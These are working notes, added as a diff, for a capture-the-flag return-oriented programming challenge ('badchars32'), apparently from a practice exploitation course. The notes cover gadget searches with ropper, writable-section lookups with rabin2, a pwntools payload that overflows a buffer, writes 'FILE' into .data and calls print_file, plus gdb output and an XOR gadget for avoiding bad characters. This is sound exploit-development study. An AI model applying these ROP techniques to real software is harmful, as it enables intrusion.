@@ -1,0 +1,56 @@
+ropper --file badchars32 --search "mov"
+0x0804854f: mov dword ptr [edi], esi; ret;
+
+ropper --file badchars32 --search "pop"
+0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret;
+0x080485b9: pop esi; pop edi; pop ebp; ret;
+0x080485ba: pop edi; pop ebp; ret;
+0x080485bb: pop ebp; ret;
+0x0804839d: pop ebx; ret;
+
+rabin2 -S badchars32 |grep rw
+24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
+25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss
+
+rabin2 -i badchars32
+4   0x080483d0 GLOBAL FUNC       print_file
+
+# Write somewhere
+0x0804854f: mov dword ptr [edi], esi; ret;
+0x080485b9: pop esi; pop edi; pop ebp; ret;
+0x0804a018: 0x8 .data
+0x0804a020: 0x4 .bss
+
+# Initial writing test
+payload = b'A' * 44
+payload += pwn.p32(0x080485b9) # pop esi; pop edi; pop ebp; ret
+payload += b"FILE"
+payload += pwn.p32(0x0804a018) # .data
+payload += b"ARG3"
+payload += pwn.p32(0x0804854f) # mov dword ptr [edi], esi; ret
+payload += b"EXIT"
+
+(gdb) run < payload.txt
+EIP: 0x54495845 ('EXIT')
+(gdb) x/s 0x0804a018
+"FILE"
+
+# Calling function
+4   0x080483d0 GLOBAL FUNC       print_file
+payload += pwn.p32(0x080483d0) # print_file
+payload += b'A' * 4
+payload += pwn.p32(0x0804a018) # .data
+
+./badchars32 < payload.txt
+Failed to open file: FILE
+
+# Xor/Unxor
+ropper --file badchars32 --search "xor"
+0x08048547: xor byte ptr [ebp], bl; ret;
+
+ropper --file badchars32 --search "pop ebp|pop ebx"
+0x080485bb: pop ebp; ret;
+0x0804839d: pop ebx; ret;
+
+No issue with the addresses produced, no need to change write location
+(both .bss and .data work without modification with 90 as XOR key)
